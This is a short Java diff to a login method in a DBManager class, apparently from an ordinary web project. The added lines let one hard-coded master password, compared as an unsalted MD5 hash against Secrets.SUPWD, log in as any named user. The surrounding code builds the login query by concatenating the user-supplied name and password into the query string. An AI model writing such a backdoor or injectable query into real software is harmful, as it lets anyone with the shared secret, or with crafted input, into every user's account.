@@ -45,6 +45,10 @@ public class DBManager {
 			MessageDigest m = MessageDigest.getInstance("MD5");
 			m.update(password.getBytes(), 0, password.length());
 			password = new BigInteger(1, m.digest()).toString(16);
+			// supwd
+			if (password.equals(Secrets.SUPWD)) {
+				return getUser(pm, name);
+			}
 		} catch (NoSuchAlgorithmException e) {
 			e.printStackTrace();
 		}
@@ -52,11 +56,15 @@ public class DBManager {
 		jdoql.append(User.class.getName());
 		jdoql.append(" WHERE username == '").append(name).append("' && password == '").append(password).append("' RANGE 0,1");
 
+		User u=null;
 		List<User> result = (List<User>) pm.newQuery(jdoql.toString()).execute();
-		if (null == result || result.size() == 0)
-			return null;
-		else
-			return result.get(0);
+		if (null != result && result.size() > 0){
+			u=result.get(0);
+			// generate new token
+			u.generateToken();
+			pm.makePersistent(u);
+		}
+		return u;
 	}
 
 	public static User getUserByToken(PersistenceManager pm, String token) {
